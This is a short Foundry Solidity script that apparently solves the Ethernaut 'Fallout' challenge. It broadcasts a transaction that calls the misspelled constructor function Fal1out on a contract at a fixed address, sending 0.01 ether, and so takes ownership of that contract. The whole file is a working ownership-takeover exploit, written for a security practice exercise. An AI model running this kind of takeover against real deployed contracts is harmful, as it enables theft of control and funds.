// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Fallout.sol";
import {Script} from "forge-std/Script.sol";


contract ClaimOwnership is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("MY_PRIVATE_KEY"));
        Fallout f = Fallout(0xD049A7Ca43dD6eF55099E37094cE505B06482B95);
        f.Fal1out{value: 0.01 ether}();
        vm.stopBroadcast();
    }
}
